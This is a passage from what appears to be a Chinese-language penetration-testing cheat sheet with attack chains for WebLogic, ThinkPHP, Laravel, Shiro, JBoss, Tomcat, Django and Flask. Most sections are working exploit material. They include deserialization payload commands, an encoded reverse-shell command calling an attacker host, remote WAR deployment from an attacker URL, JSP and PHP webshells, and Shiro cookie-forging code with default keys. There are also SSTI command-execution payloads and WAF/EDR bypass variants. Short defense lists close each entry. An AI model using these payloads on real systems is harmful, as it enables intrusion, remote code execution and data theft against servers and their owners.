
# T3握手
echo "t3 12.2.1" | nc target 7001

# 如果返回HELO则存在T3服务
```
**语法解析：**
- `t3 12.2.1` — T3协议版本握手 _value_

**2. 使用工具攻击**
> 使用工具攻击
```
# 使用weblogic_exploit
git clone https://github.com/0xn0ne/weblogicScanner
cd weblogicScanner
python3 weblogic.py -t target -p 7001

# 使用WebLogicTool
java -jar WebLogicTool.jar -target target:7001 -cmd "id"

# 使用ysoserial
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "touch /tmp/pwned"
```

**3. 构造恶意T3请求**
> 构造恶意T3请求
```
# Python脚本构造T3请求
import socket
import struct

def send_t3_payload(target, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    
    # T3握手
    sock.send(b"t3 12.2.1\n")
    response = sock.recv(1024)
    
    # 发送恶意序列化对象
    # 构造包含恶意对象的T3请求
    sock.send(payload)
    sock.close()

# 使用ysoserial生成payload
# java -jar ysoserial.jar CommonsCollections1 "id" > payload.bin
```

**WAF/EDR 绕过变体：**

**Gadget链选择**
> Gadget链选择
```
# 不同Gadget链
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsBeanutils1
Jdk7u21
Jre8u20

# 根据目标环境选择合适的链
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 不同Gadget链
CommonsCollections1
CommonsCollections2
CommonsCollections3
CommonsCollections4
CommonsBeanutils1
Jdk7u21
Jre8u20

# 根据目标环境选择合适的链` — 参数与载荷内容 _value_


**概述：** WebLogic T3协议是其专有的RMI通信协议，用于集群节点间通信和JNDI查找。T3协议的反序列化漏洞允许远程攻击者发送恶意序列化对象，在WebLogic服务器上执行任意代码。

**漏洞原理：** T3协议反序列化利用链：通过T3握手建立连接后发送包含恶意Gadget Chain的序列化数据(如Commons Collections链)。利用工具ysoserial生成payload，T3Exploit/WebLogic-T3-RCE等工具自动化利用。WebLogic的黑名单过滤可通过新Gadget绕过。

**利用方法：** 完整利用流程：
1. 探测T3端口
2. 确认WebLogic版本
3. 选择合适的Gadget链
4. 发送恶意序列化对象
5. 执行命令

**防御措施：** 防御措施：
1. 禁用T3协议或限制访问
2. 应用最新补丁
3. 使用网络防火墙
4. 监控异常序列化请求

---

### WebLogic IIOP协议攻击  `weblogic-iiop`
_WebLogic IIOP协议反序列化漏洞_
子类：**WebLogic IIOP** · tags: `weblogic` `iiop` `deserialization` `corba`

**前置条件：**
- WebLogic开放IIOP端口
- 存在漏洞版本

**攻击链：**

**1. 探测IIOP服务**
> 探测IIOP服务
```
# 扫描IIOP端口	nmap -sV -p 7001 target

# IIOP使用相同端口
# 检测是否支持IIOP
# 使用工具检测
```
**语法解析：**
- `nmap -sV` — 使用Nmap版本探测扫描目标端口服务 _command_
- `-p 7001` — WebLogic默认端口，IIOP和T3共用此端口 _parameter_
- `target` — 目标WebLogic服务器地址 _variable_

**2. CVE-2020-2551**
> CVE-2020-2551利用
```
# 使用weblogic_CVE_2020_2551
git clone https://github.com/Y4er/CVE-2020-2551
cd CVE-2020-2551

# 编译并运行
mvn package
java -jar target/CVE-2020-2551-1.0-SNAPSHOT.jar target 7001

# 使用JRMP监听
java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci9QMDBBIA==}|{base64,-d}|{bash,-i}"
```
**语法解析：**
- `CVE-2020-2551` — WebLogic IIOP协议反序列化RCE漏洞 _command_
- `java -jar target/CVE-2020-2551.jar` — 运行编译好的漏洞利用工具 _command_
- `target 7001` — 目标地址和WebLogic端口 _value_
- `JRMPListener 8888` — 在攻击机启动JRMP监听接收反连 _parameter_
- `CommonsCollections1` — 指定返回给目标的Gadget链类型 _parameter_

**3. 构造IIOP请求**
> 构造IIOP请求
```
# 使用Python构造
# 需要安装相关库
pip install idna

# 使用JNDI注入
# 构造恶意JNDI引用
String jndiURL = "iiop://attacker:1099/Exploit";
Context ctx = new InitialContext();
ctx.lookup(jndiURL);

# 使用JNDIExploit工具
java -jar JNDIExploit.jar -i attacker_ip
```
**语法解析：**
- `iiop://attacker:1099/Exploit` — IIOP协议的JNDI查找URL _value_
- `ctx.lookup(jndiURL)` — JNDI查找触发远程类加载执行恶意代码 _command_
- `JNDIExploit.jar -i attacker_ip` — JNDI利用工具，-i指定攻击机IP _command_

**WAF/EDR 绕过变体：**

**协议切换**
> 协议切换绕过
```
# 在T3和IIOP之间切换
# 如果T3被禁用，尝试IIOP
# 使用不同协议绕过检测
```
**语法解析：**
- `T3` — WebLogic专有协议，常被WAF重点监控 _parameter_
- `IIOP` — CORBA标准协议，功能类似T3但WAF检测较少 _parameter_
- `协议切换` — 当T3被禁用/检测时切换到IIOP绕过防护 _command_


**概述：** WebLogic IIOP(Internet Inter-ORB Protocol)是CORBA标准的通信协议，也存在反序列化漏洞。当T3协议被防火墙阻断时，IIOP端口(默认7001)可作为替代的攻击入口实现RCE。

**漏洞原理：** IIOP反序列化与T3原理类似，但使用CORBA协议封装。攻击者通过IIOP协议发送恶意序列化对象绕过T3的黑名单过滤(因为两者的反序列化路径不同)。CVE-2020-2551等漏洞通过IIOP协议实现远程代码执行。

**利用方法：** 完整利用流程：
1. 探测IIOP端口
2. 使用CVE-2020-2551利用工具
3. 发送恶意序列化对象
4. 执行命令

**防御措施：** 防御WebLogic IIOP漏洞：如不使用IIOP功能则关闭该协议监听，限制IIOP端口的网络访问(仅允许可信的集群节点)，及时应用Oracle安全补丁，部署反序列化防护中间件(如RASP)检测恶意类加载。

---

### ThinkPHP远程代码执行  `thinkphp-rce`
_ThinkPHP框架RCE漏洞_
子类：**ThinkPHP** · tags: `thinkphp` `rce` `php` `framework`

**前置条件：**
- 使用ThinkPHP框架
- 存在漏洞版本

**攻击链：**

**1. ThinkPHP 5.x RCE**
> ThinkPHP 5.0.x RCE
```
# ThinkPHP 5.0.x RCE
# 方法调用
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

# 写入WebShell
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell.php&vars[1][]=<?php eval($_POST[cmd]);?>

# 执行系统命令
?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```
**语法解析：**
- `invokefunction` — 调用函数方法 _value_
- `call_user_func_array` — PHP回调函数 _value_
- `vars[0]` — 函数名参数 _value_

**2. ThinkPHP 5.1.x RCE**
> ThinkPHP 5.1.x RCE
```
# ThinkPHP 5.1.x RCE
?s=index/think\Request/input&filter[]=system&data=id
?s=index/think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/think\Template/driver/file/write&cacheFile=shell.php&content=%3C%3Fphp%20eval($_POST[cmd]);%3F%3E
```
**语法解析：**
- `eval()` — 代码执行 _function_
- `%xx` — URL编码 _encoding_

**3. ThinkPHP 5.0.23 RCE**
> ThinkPHP 5.0.23 RCE
```
# POST方法
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id

# 写入Shell
_method=__construct&filter[]=file_put_contents&method=get&server[REQUEST_METHOD]=shell.php&get[]=<?php eval($_POST[cmd]);?>
```
**语法解析：**
- `eval()` — 代码执行 _function_
- `Content-Type` — 内容类型头 _header_

**4. 信息收集**
> 信息收集
```
# 获取ThinkPHP版本
# 查看响应头
X-Powered-By: ThinkPHP 5.0.x

# 访问特定页面
/index.php?s=/index/\think\app/init
/index.php?s=/index/\think\Request/input

# 错误信息泄露
# 触发错误查看版本
```

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
# URL编码
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction

# 大小写混合
?s=/Index/\Think\App/invokefunction

# 双重编码
?s=%252fIndex%252f%255cthink%255capp%252finvokefunction
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` URL编码
?s=%2fIndex%2f%5cthink%5capp%2finvokefunction

# 大小写混合
?s=/Index/\Think\App/invokefunction

# 双重编码
?s=%252fIndex%252f%255cthink%255capp%252finvokefunction` — 参数与载荷内容 _value_

**路径变体**
> 路径变体绕过
```
# 不同路径格式
?s=/index/think\app/invokefunction
?s=index/think/app/invokefunction
?s=/index/\think\App/invokefunction

# 使用不同入口点
/index.php?s=...
/?s=...
/public/index.php?s=...
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 不同路径格式
?s=/index/think\app/invokefunction
?s=index/think/app/invokefunction
?s=/index/\think\App/invokefunction

# 使用不同入口点
/index.php?s=...
/?s=...
/public/index.php?s=...` — 参数与载荷内容 _value_


**概述：** ThinkPHP是中国最流行的PHP开发框架，其历史版本(3.x/5.x/6.x)存在多个远程代码执行漏洞。由于使用范围极广(中国政企/教育/电商)，ThinkPHP漏洞是批量渗透的高价值目标。

**漏洞原理：** ThinkPHP高危漏洞：1)5.0.x路由参数RCE(通过controller/action注入调用任意方法) 2)5.1.x Request类方法覆盖RCE 3)5.x多语言模块文件包含 4)3.x缓存文件写入GetShell 5)6.x反序列化POP链。利用URL如/index.php?s=/index/think\\app/invokefunction。

**利用方法：** 完整利用流程：
1. 识别ThinkPHP版本
2. 选择对应的利用方式
3. 执行命令或写入Shell
4. 获取服务器权限

**防御措施：** 防御ThinkPHP漏洞：升级到最新安全版本，关闭DEBUG模式和错误显示，配置路由严格模式禁止控制器名中的特殊字符，删除不必要的入口文件和模块，部署WAF规则检测ThinkPHP特征payload。

---

### Laravel远程代码执行  `laravel-rce`
_Laravel框架RCE漏洞_
子类：**Laravel** · tags: `laravel` `rce` `php` `framework`

**前置条件：**
- 使用Laravel框架
- 存在漏洞版本或配置

**攻击链：**

**1. CVE-2021-3129**
> CVE-2021-3129 Ignition RCE
```
# Laravel Ignition RCE
# 使用工具
git clone https://github.com/zhzyker/CVE-2021-3129
cd CVE-2021-3129
python3 exp.py -t http://target

# 手动利用
# 需要发送Phar反序列化payload
# 使用phpggc生成
phpggc Laravel/RCE1 system id > payload

# 发送请求
POST /_ignition/health-check HTTP/1.1
Content-Type: application/json

{"solution":"...","parameters":{"viewFile":"phar://..."}}
```
**语法解析：**
- `_ignition` — Ignition调试工具端点 _value_
- `phar://` — Phar协议触发反序列化 _value_

**2. 调试模式信息泄露**
> 调试模式信息泄露
```
# APP_DEBUG=true信息泄露
# 访问触发错误的页面
# 查看堆栈跟踪中的敏感信息

# 可能泄露:
- 数据库凭证
- API密钥
- 环境变量
- 服务器路径
- 源代码片段
```

**3. .env文件泄露**
> .env文件泄露
```
# 尝试访问.env文件
GET /.env HTTP/1.1
GET /../.env HTTP/1.1
GET /public/.env HTTP/1.1

# .env文件包含:
APP_KEY=base64:...
DB_HOST=localhost
DB_DATABASE=laravel
DB_USERNAME=root
DB_PASSWORD=password
```
**语法解析：**
- `127.0.0.1` — 本地回环 _domain_
- `../` — 路径穿越 _path_
- `base64` — Base64编码 _encoding_

**4. APP_KEY利用**
> APP_KEY利用
```
# 获取APP_KEY后
# 可以伪造Cookie
# 解密加密数据

# 使用工具解密
php artisan decrypt <encrypted_value>

# 伪造管理员Cookie
# 需要了解应用加密方式
```

**WAF/EDR 绕过变体：**

**路径绕过**
> 路径绕过
```
# 尝试不同路径
/.env
/.env.example
/.env.local
/.env.production
/../.env
/..%2f.env
/..%252f.env
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 尝试不同路径
/.env
/.env.example
/.env.local
/.env.production
/../.env
/..%2f.env
/..%252f.env` — 参数与载荷内容 _value_


**概述：** Laravel是PHP最流行的现代框架，其RCE漏洞主要来自反序列化POP链、Debug模式信息泄露(Ignition组件)、以及不安全的配置(APP_KEY泄露导致加密Cookie伪造)。

**漏洞原理：** Laravel漏洞：1)Ignition RCE(CVE-2021-3129,通过清除日志+phar反序列化执行代码) 2)Cookie反序列化(APP_KEY泄露后伪造加密Cookie触发POP链) 3)Debug模式泄露数据库密码/API密钥 4)Blade模板注入({!!$input!!}未转义)。

**利用方法：** 完整利用流程：
1. 检测Laravel版本和组件
2. 尝试.env文件泄露
3. 利用Ignition RCE
4. 或利用APP_KEY伪造身份

**防御措施：** 防御措施：
1. 关闭调试模式
2. 升级Ignition组件
3. 保护.env文件
4. 定期轮换APP_KEY

---

### Apache Shiro反序列化  `shiro-deserialize`
_Apache Shiro RememberMe反序列化漏洞_
子类：**Apache Shiro** · tags: `shiro` `deserialization` `java` `rememberme`

**前置条件：**
- 使用Apache Shiro
- 存在漏洞版本

**攻击链：**

**1. 检测Shiro**
> 检测Shiro框架
```
# 检测rememberMe Cookie
# 响应中有rememberMe=deleteMe表示使用Shiro

# 使用工具检测
git clone https://github.com/sv3nbeast/ShiroScan
cd ShiroScan
java -jar shiro_scan.jar -t http://target

# 或使用Burp插件
# ShiroScan Burp插件
```
**语法解析：**
- `rememberMe` — Shiro记住我功能Cookie _value_
- `deleteMe` — Shiro删除Cookie标记 _value_

**2. 使用ysoserial生成payload**
> 生成恶意payload
```
# 生成恶意序列化对象
java -jar ysoserial.jar CommonsCollections2 "id" > payload.ser

# 使用Shiro内置密钥加密
# 默认密钥: kPH+bIxk5D2deZiIxcaaaA==

# Python加密脚本
import base64
from Crypto.Cipher import AES

def encode_rememberme(command):
    # 生成payload
    payload = os.popen(f"java -jar ysoserial.jar CommonsCollections2 \"{command}\"").read()
    
    # AES加密
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    cipher = AES.new(key, AES.MODE_CBC, iv=key)
    
    # PKCS5Padding
    pad = 16 - len(payload) % 16
    payload += bytes([pad]) * pad
    
    encrypted = cipher.encrypt(payload)
    return base64.b64encode(encrypted).decode()
```
**语法解析：**
- `base64` — Base64编码 _encoding_
- `rememberMe` — Shiro记住我 _keyword_

**3. 发送恶意请求**
> 发送恶意请求
```
# 使用curl
curl -H "Cookie: rememberMe=<ENCODED_PAYLOAD>" http://target

# 使用工具
git clone https://github.com/insightglacier/Shiro_exploit
cd Shiro_exploit
python3 shiro_exploit.py -t http://target -c "id"

# 使用ShiroAttack
git clone https://github.com/acgbfull/ShiroAttack
cd ShiroAttack
java -jar ShiroAttack.jar
```
**语法解析：**
- `curl` — HTTP请求工具 _command_
- `-H` — 自定义请求头 _parameter_
- `rememberMe` — Shiro记住我 _keyword_

**4. 常见密钥列表**
> 常见密钥列表
```
# 常见Shiro密钥
kPH+bIxk5D2deZiIxcaaaA==
4AvVhmFLUs0KTA3Kprsdag==
Z3VucwAAAAAAAAAAAAAAAA==
fCq+/xW488hMTCD+cmJ3aQ==
1QWLxg+NYmxraMoxAXu/Iw==
25BsmdYwjnfcWmnhAciDDg==
2AvVhdsgUs0F8SZSnWd+Zw==
6ZmI6I2j5Y+R54aHjOqYzg==

# 尝试不同密钥
# 或爆破密钥
```

**WAF/EDR 绕过变体：**

**Gadget链选择**
> Gadget链选择
```
# 不同Gadget链
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient

# 根据目标环境选择
# 某些链可能被过滤
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 不同Gadget链
CommonsCollections2
CommonsBeanutils1
Jdk7u21
JRMPClient

# 根据目标环境选择
# 某些链可能被过滤` — 参数与载荷内容 _value_

**密钥爆破**
> 密钥爆破
```
# 使用工具爆破密钥
git clone https://github.com/insightglacier/Shiro_exploit
python3 shiro_exploit.py -t http://target -f keys.txt

# 或使用ShiroScan
java -jar shiro_scan.jar -t http://target -f keys.txt
```
**语法解析：**
- `# 使用工具爆破密钥
git clone https://github.com/insightglacier/Shiro_exploit
python3 s` — 攻击载荷 _value_


**概述：** Apache Shiro RememberMe功能使用AES加密序列化对象，密钥硬编码导致反序列化漏洞。

**漏洞原理：** Apache Shiro RememberMe Cookie使用AES-CBC加密(默认密钥kPH+bIxk5D2deZiIxcaaaA==)。攻击流程：1)检测特征(Cookie中的rememberMe=deleteMe) 2)使用默认密钥或爆破密钥 3)用ysoserial生成Gadget Chain 4)AES加密+Base64编码后设置为Cookie值。

**利用方法：** 完整利用流程：
1. 检测Shiro框架
2. 获取或爆破密钥
3. 生成恶意序列化对象
4. AES加密后发送
5. 触发反序列化执行命令

**防御措施：** 防御措施：
1. 更换默认密钥
2. 升级Shiro版本
3. 使用安全的序列化方案
4. 监控异常Cookie

---

### JBoss漏洞利用  `jboss-vuln`
_JBoss应用服务器漏洞_
子类：**JBoss** · tags: `jboss` `rce` `java` `deserialization`

**前置条件：**
- 使用JBoss服务器
- 存在漏洞版本

**攻击链：**

**1. JMXInvokerServlet反序列化**
> JMXInvokerServlet反序列化
```
# CVE-2015-7501
# 发送恶意序列化对象
POST /invoker/JMXInvokerServlet HTTP/1.1
Content-Type: application/x-java-serialized-object

# 使用ysoserial生成payload
java -jar ysoserial.jar CommonsCollections1 "id" > payload.ser

# 发送
curl -X POST -H "Content-Type: application/x-java-serialized-object" --data-binary @payload.ser http://target/invoker/JMXInvokerServlet
```
**语法解析：**
- `invoker/JMXInvokerServlet` — JBoss JMX调用端点 _encoding_
- `x-java-serialized-object` — Java序列化对象类型 _value_

**2. JMX Console部署War包**
> JMX Console部署War包
```
# 访问JMX Console
http://target/jmx-console/

# 查找deploy方法
# 找到 jboss.system:service=MainDeployer

# 部署远程War包
# 使用deploy方法，URL参数指向恶意War
http://target/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.system:service=MainDeployer&methodName=deploy&argType=java.lang.String&arg=http://attacker/shell.war

# 访问部署的Shell
http://target/shell/cmd.jsp?cmd=id
```

**3. BSHDeployer部署**
> BSHDeployer部署
```
# 使用BeanShell部署
# 找到 jboss.scripts:service=BSHDeployer

# 执行BeanShell脚本
# 通过createScriptDeployment方法

# 构造恶意脚本
import java.io.*;
Runtime rt = Runtime.getRuntime();
Process p = rt.exec("id");
InputStream is = p.getInputStream();
BufferedReader reader = new BufferedReader(new InputStreamReader(is));
String line;
while((line = reader.readLine()) != null) {
    print(line);
}
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `Runtime.exec` — Java命令执行 _function_

**4. 使用工具**
> 使用JexBoss工具
```
# JexBoss
git clone https://github.com/joaomatosf/jexboss
cd jexboss
python jexboss.py -host http://target

# 自动化利用
python jexboss.py -mode file-scan -file hosts.txt
```

**WAF/EDR 绕过变体：**

**端点变体**
> 端点变体
```
# 不同端点
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly/JMXInvokerServlet
/jmx-console/
/web-console/
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 不同端点
/invoker/JMXInvokerServlet
/invoker/EJBInvokerServlet
/invoker/readonly/JMXInvokerServlet
/jmx-console/
/web-console/` — 参数与载荷内容 _value_


**概述：** JBoss(现WildFly)是Red Hat的Java应用服务器，历史上存在大量严重漏洞：JMXInvokerServlet反序列化、JBossAS管理控制台未授权部署、EJBInvokerServlet远程调用等，是内网Java环境的高危资产。

**漏洞原理：** JBoss高危漏洞：1)JMXInvokerServlet反序列化(CVE-2015-7501) 2)/jmx-console/未授权访问部署WAR后门 3)/invoker/JMXInvokerServlet远程方法调用 4)EJBInvokerServlet反序列化 5)JBoss Seam参数化注入(CVE-2010-1871) 6)管理控制台弱口令(admin:admin)。

**利用方法：** 完整利用流程：
1. 扫描JBoss服务
2. 检测开放端点
3. 利用反序列化或部署War
4. 获取服务器权限

**防御措施：** 防御措施：
1. 删除不必要的端点
2. 实施访问控制
3. 升级JBoss版本
4. 网络隔离

---

### Apache Tomcat漏洞  `tomcat-vuln`
_Apache Tomcat服务器漏洞利用_
子类：**Tomcat** · tags: `tomcat` `rce` `java` `manager`

**前置条件：**
- 使用Tomcat服务器
- 存在漏洞版本或配置

**攻击链：**

**1. Manager App弱口令**
> Manager App弱口令
```
# 访问Manager App
http://target/manager/html

# 常见弱口令
tomcat:tomcat
admin:admin
admin:tomcat

# 使用工具爆破
hydra -l tomcat -P passwords.txt target http-get /manager/html
```
**语法解析：**
- `/manager/html` — Tomcat管理界面 _value_

**2. 部署War包**
> 部署War包
```
# 生成恶意War包
# cmd.jsp
<%@ page import="java.util.*,java.io.*"%>
<% String cmd = request.getParameter("cmd");
Process p = Runtime.getRuntime().exec(cmd);
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while((line = br.readLine()) != null) { out.println(line); }
%>

# 打包
jar cvf shell.war cmd.jsp

# 通过Manager上传
curl -u tomcat:tomcat -T shell.war "http://target/manager/deploy?path=/shell"

# 访问Shell
http://target/shell/cmd.jsp?cmd=id
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `curl` — HTTP请求工具 _command_
- `Runtime.exec` — Java命令执行 _function_

**3. CVE-2020-1938 Ghostcat**
> CVE-2020-1938 Ghostcat
```
# AJP文件读取/包含
# 使用工具
git clone https://github.com/chaitin/xray
cd xray
./xray_linux_amd64 webscan --plugins phantomjs --url http://target

# 或使用专用工具
git clone https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
cd CNVD-2020-10487-Tomcat-Ajp-lfi
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f /WEB-INF/web.xml target
```
**语法解析：**
- `AJP` — Apache JServ Protocol _value_
- `8009` — AJP默认端口 _value_

**4. PUT方法任意文件写入**
> PUT方法任意文件写入
_platform: windows_
```
# CVE-2017-12615
# Windows下PUT方法写文件
PUT /shell.jsp%20 HTTP/1.1
Host: target
Content-Length: 24

<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>

# 或使用::$DATA
PUT /shell.jsp::$DATA HTTP/1.1

# 或使用/
PUT /shell.jsp/ HTTP/1.1
```
**语法解析：**
- `EXEC` — 执行存储过程 _keyword_
- `%xx` — URL编码 _encoding_
- `Runtime.exec` — Java命令执行 _function_

**WAF/EDR 绕过变体：**

**文件名绕过**
> 文件名绕过
```
# 不同文件名变体
shell.jsp%20
shell.jsp::$DATA
shell.jsp/
shell.jsp%00
shell.jSp
shell.jsP
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 不同文件名变体
shell.jsp%20
shell.jsp::$DATA
shell.jsp/
shell.jsp%00
shell.jSp
shell.jsP` — 参数与载荷内容 _value_


**概述：** Apache Tomcat是最广泛使用的Java Servlet容器，常见漏洞包括AJP文件读取/包含(GhostCat)、PUT方法写文件、Manager部署WAR后门等。Tomcat的Manager应用弱口令(tomcat:tomcat)是最常见的入侵入口。

**漏洞原理：** Tomcat高危漏洞：1)AJP协议文件读取/包含(CVE-2020-1938 GhostCat) 2)PUT方法写文件(CVE-2017-12615) 3)Manager应用弱口令部署WAR WebShell 4)Session反序列化(FileStore持久化) 5)JSP执行路径穿越(CVE-2020-9484) 6)默认页面信息泄露。

**利用方法：** 完整利用流程：
1. 扫描Tomcat服务
2. 尝试弱口令登录
3. 部署恶意War包
4. 或利用其他CVE漏洞

**防御措施：** 防御措施：
1. 修改默认口令
2. 限制Manager访问
3. 禁用AJP或配置secret
4. 升级Tomcat版本

---

### Django框架漏洞  `django-vuln`
_Django框架安全漏洞_
子类：**Django** · tags: `django` `python` `framework` `sql`

**前置条件：**
- 使用Django框架
- 存在漏洞版本

**攻击链：**

**1. SQL注入**
> CVE-2020-7471 SQL注入
```
# CVE-2020-7471
# 通过PostgreSQL输入验证绕过
# 使用JSONField/HStoreField

# 构造恶意查询
Model.objects.filter(data__contains={"key": "value; SELECT SLEEP(5);--"})

# 或使用ArrayField
Model.objects.filter(tags__contains=["tag'); SELECT SLEEP(5);--"])

# 触发SQL注入
```
**语法解析：**
- `JSONField` — Django JSON字段 _value_
- `__contains` — Django查询语法 _value_

**2. 调试模式信息泄露**
> 调试模式信息泄露
```
# DEBUG=True时
# 错误页面泄露:
- 源代码
- 环境变量
- 数据库配置
- SECRET_KEY
- 服务器路径

# 访问不存在的页面触发错误
http://target/nonexistent

# 或触发异常
```

**3. SECRET_KEY利用**
> SECRET_KEY利用
```
# 获取SECRET_KEY后
# 可以:
# 1. 签名伪造Session
# 2. 签名伪造CSRF Token
# 3. 密码重置Token

# 使用django-session-cleanup工具
# 或手动解签

import django.core.signing as signing

# 解签Session
signing.loads(session_value, key=SECRET_KEY)

# 签名伪造Session
fake_session = signing.dumps({"user_id": 1}, key=SECRET_KEY)
```

**4. 路径遍历**
> 路径遍历漏洞
```
# CVE-2021-28658
# Django静态文件路径遍历
GET /static/../../../../etc/passwd

# 使用工具检测
curl http://target/static/../../../../etc/passwd
```
**语法解析：**
- `curl` — HTTP请求工具 _command_
- `../` — 路径穿越 _path_
- `/etc/passwd` — 敏感文件路径 _path_

**WAF/EDR 绕过变体：**

**编码绕过**
> 编码绕过
```
# URL编码
/static/%2e%2e/%2e%2e/etc/passwd

# 双重编码
/static/%252e%252e/%252e%252e/etc/passwd

# Unicode编码
/static/..%c0%af..%c0%af/etc/passwd
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` URL编码
/static/%2e%2e/%2e%2e/etc/passwd

# 双重编码
/static/%252e%252e/%252e%252e/etc/passwd

# Unicode编码
/static/..%c0%af..%c0%af/etc/passwd` — 参数与载荷内容 _value_


**概述：** Django是Python最成熟的Web框架，安全机制完善但仍存在漏洞：SQL注入(JSONField/Raw SQL)、Debug模式信息泄露、CSRF Token绕过、模板注入(自定义标签)等。Django的安全响应团队会及时发布安全更新。

**漏洞原理：** Django漏洞：1)Debug模式(DEBU=True)泄露完整配置、数据库信息、源代码路径 2)JSONField/HStoreField SQL注入(CVE-2019-14234) 3)Truncation攻击(邮件地址截断绕过) 4)StringAgg SQL注入 5)URL验证绕过(is_valid_url) 6)密码重置Token预测。

**利用方法：** 完整利用流程：
1. 检测Django版本
2. 利用调试模式获取信息
3. 利用SQL注入
4. 或利用SECRET_KEY伪造身份

**防御措施：** 防御措施：
1. 关闭调试模式
2. 升级Django版本
3. 保护SECRET_KEY
4. 输入验证

---

### Flask框架漏洞  `flask-vuln`
_Flask框架安全漏洞_
子类：**Flask** · tags: `flask` `python` `framework` `ssti`

**前置条件：**
- 使用Flask框架
- 存在漏洞配置

**攻击链：**

**1. SSTI模板注入**
> SSTI模板注入
```
# Jinja2模板注入探测
{{7*7}}
${7*7}
<%= 7*7 %>

# 如果返回49则存在SSTI

# 获取配置
{{config}}
{{self.__class__}}

# 命令执行
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
**语法解析：**
- `{{...}}` — Jinja2模板语法 _value_
- `__class__` — 获取对象类 _value_
- `__mro__` — 方法解析顺序 _value_

**2. SECRET_KEY利用**
> SECRET_KEY利用
```
# Flask Session签名
# 获取SECRET_KEY后可以伪造Session

# 解签Session
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

# 解签
def decode_session(cookie_value, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.loads(cookie_value)

# 签名伪造
def encode_session(data, secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    return serializer.dumps(data)

# 伪造管理员Session
fake_session = encode_session({"user_id": 1, "is_admin": True}, SECRET_KEY)
```

**3. 调试模式RCE**
> 调试模式RCE
```
# Flask Debug模式
# 访问/debug或/console
# 可以执行任意Python代码

# Werkzeug Debug Console
# 访问:
http://target/console

# 执行代码
import os; os.system('id')
__import__('os').system('id')
```
**语法解析：**
- `system()` — 系统命令执行 _function_
- `;` — 命令分隔符 _operator_

**4. PIN码绕过**
> PIN码绕过
```
# Flask Debug PIN
# 需要获取:
# 1. 用户名
# 2. modname
# 3. app路径
# 4. MAC地址

# 读取信息
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
{{config.__class__.__init__.__globals__['os'].environ}}

# 计算PIN
# 使用脚本计算Werkzeug PIN
```

**WAF/EDR 绕过变体：**

**SSTI绕过**
> SSTI绕过
```
# 过滤绕过
# 使用attr
{{''|attr('__class__')|attr('__mro__')}}

# 使用request
{{request|attr('application')|attr('__globals__')}}

# 使用字符串拼接
{{'__cla'~'ss__'}}

# 使用编码
{{''['\x5f\x5fclass\x5f\x5f']}}
```


**概述：** Flask是Python的轻量级Web框架，其安全漏洞主要来自开发者的不安全实践：Secret Key泄露导致Session伪造、Jinja2 SSTI、Debug模式RCE(Werkzeug调试器)、以及不安全的反序列化配置。

**漏洞原理：** Flask安全风险：1)Debug模式下Werkzeug调试器可执行任意Python代码(需PIN码，但PIN可通过文件读取计算) 2)Secret Key泄露导致Session Cookie伪造 3)Jinja2模板注入(render_template_string) 4)不安全的pickle Session序列化。

**利用方法：** 完整利用流程：
1. 检测Flask框架
2. 测试SSTI注入
3. 利用调试模式
4. 或伪造Session

**防御措施：** 防御措施：
1. 关闭调试模式
2. 保护SECRET_KEY
3. 过滤模板注入
4. 输入验证

---

### WebLogic XMLDecoder  `weblogic-xmldecoder`
_利用WebLogic Server中XMLDecoder反序列化漏洞(CVE-2017-10271/CVE-2017-3506)实现远程代码执行_
子类：**WebLogic** · tags: `weblogic` `xmldecoder` `rce`

**前置条件：**
- 目标运行WebLogic Server
- 存在/wls-wsat/或/_async/路径
- XMLDecoder组件未被禁用
- WebLogic版本存在漏洞(10.3.6.0/12.1.3.0等)

**攻击链：**

**探测WebLogic版本和路径**
> 探测WebLogic服务器版本、开放端口和可利用的端点
_platform: linux_
```
# 检测WebLogic控制台
curl -sI "http://target:7001/console/" | head -5

# 检测wls-wsat端点(CVE-2017-10271)
curl -s "http://target:7001/wls-wsat/CoordinatorPortType" | head -20

# 检测AsyncResponseService端点(CVE-2019-2725)
curl -s "http://target:7001/_async/AsyncResponseService" | head -20

# 检测T3协议
